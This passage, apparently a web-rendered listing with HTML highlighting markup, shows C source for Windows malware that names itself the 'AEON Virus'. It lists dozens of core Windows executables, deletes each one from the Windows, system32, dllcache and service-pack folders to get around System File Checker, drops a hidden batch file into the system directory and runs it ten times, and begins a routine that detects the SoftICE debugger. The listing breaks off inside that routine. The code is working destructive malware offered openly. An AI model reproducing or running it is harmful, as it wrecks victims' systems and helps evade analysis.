                        </span><span class="sc6">"drwatson.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"drwtsn32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dumprep.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dvdupgrd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dwwin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dxdiag.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"dxdllreg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"esentutl.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"eudcedit.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"eventvwr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"exe2bin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"expand.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"extrac32.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"fc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"find.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"findstr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"finger.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fixmapi.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fltmc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fontview.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"forcedos.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"freecell.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsquirt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsutil.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ftp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"getmac.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gdi.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"grpconv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"help.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hostname.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"iexpress.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"imapi.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ipconfig.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ipsec6.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ipv6.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"java.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"javaw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"javaws.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"jdbgmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jview.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"krnl386.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"label.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lights.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lnkstub.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"locator.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lodctr.exe"</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc6">"logagent.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"logman.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"logoff.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"logonui.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lpq.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lpr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"magnify.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"makecab.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mem.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mmc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mnmsrvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mobsync.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mountvol.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mplay32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mpnotify.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"mrinfo.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msdtc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mshearts.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mshta.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msiexec.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mspaint.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mstinit.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"mstsc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"narrator.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nbtstat.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nddeapir.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"net.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"netdde.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"netsetup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"netsh.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"netstat.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nslookup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"odbcad32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"odbcconf.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"osk.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"osuninst.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"packager.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pathping.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"perfmon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ping6.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ping.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"powercfg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"print.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"proxycfg.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"qappsrv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"qprocess.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"qwinsta.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rasautou.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rasdial.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rasphone.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rcimlby.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"rcp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rdpclip.exe"</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc6">"rdsaddin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rdshost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"recover.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"redir.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"reg.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regedt32.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"regini.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regsvr32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regwiz.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"replace.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"reset.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rexec.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"route.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"routemon.exe"</span><span class="sc10">,</span><span class="sc0"> 
                        </span><span class="sc6">"rsh.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rsm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rsmsink.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rsmui.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rsvp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rtcshare.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"runas.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rundll32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"runonce.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"rwinsta.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"savedump.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scardsvr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sdbinst.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"services.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sessmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sethc.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"setserv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sfc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shadow.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"share.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shmgrate.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shrpubw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"shutdown.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sigverif.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"skeys.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"slrundll.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"slserv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smbinst.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smlogsvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sndrec32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sndvol32.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"sol.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sort.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"spider.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"spnpinst.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sprestrt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"spdupdsvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"stimon.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"subst.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"svchost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"syncapp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sysedit.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"syskey.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sysocmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"systray.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"taskman.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"taskmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tcmsetup.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tcpsvcs.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"telnet.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tftp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tracert6.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tracert.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"tscon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tscupgrd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tsdiscon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tskill.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tsshutdn.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"unlodctr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"upnpcont.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ups.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"user.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"userinit.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"utilman.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"uWDF.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"verifier.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vssadmin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vssvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"w32tm.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"WdfMgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wextract.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wiaacmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winchat.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winmine.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winmsd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"winspool.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"winver.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wjview.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wmpstub.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wowdeb.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wowexec.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wpabaln.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wpdshextautoplay.exe"</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc6">"wpnpinst.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"write.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wscntfy.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wscript.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wuauclt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WudfHost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wupdmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"xcopy.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* A function deleting SFC protected files by deleting them everywhere on the PC:
    - %windir%\ServicePackFiles\i386
    - %windir%
    - %windir%\system32
    - %windir%\system32\dllcache
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DeleteFileName</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szFileName</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir1</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir3</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir4</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc1">/* %windir\ServicePackFiles\i386\&lt;FILENAME&gt; */</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir1</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\ServicePackFiles\\i386\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileName</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* %windir%\&lt;FILENAME&gt; */</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileName</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* %windir%\system32\&lt;FILENAME&gt; */</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir3</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\system32\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileName</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* %windir%\system32\dllcache\&lt;FILENAME&gt; */</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir4</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\system32\\dllcache\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szFileName</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Delete one file after the other */</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szWinDir1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szWinDir3</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szWinDir4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Drop a batch file displaying a short message and keeping it open (" pause "), will be executed 10 times */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">DropAndExecuteBatch</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDirFile</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Batch script displaying some information and keeping opened because of the " pause " command */</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBatch</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"@echo off\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo ======================\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo === [ AEON Virus ] ===\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo ======================\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo Author: SkyOut\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo Team: [Electrical Ordered Freedom] [EOF]\r\n"</span><span class="sc0">
                        </span><span class="sc6">"echo Date: 2006\r\n"</span><span class="sc0">
                        </span><span class="sc6">"pause"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* %sysdir%\Aeon.bat */</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDirFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDirFile</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDirFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Aeon.bat"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create the batch file */</span><span class="sc0">
    </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">szSysDirFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">|</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CREATE_ALWAYS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBatch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBatch</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwNumberOfBytesWritten</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Make it hidden */</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">szSysDirFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_HIDDEN</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Execute it ten times */</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDirFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_NORMAL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* check for SoftIce by Registry key and checking if the driver is loaded in memory */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">IsSoftIcePresent</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* Check the registry key */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\SoftICE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* SoftIce found */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc1">/* check if the driver is loaded in the memory */</span><span class="sc0">
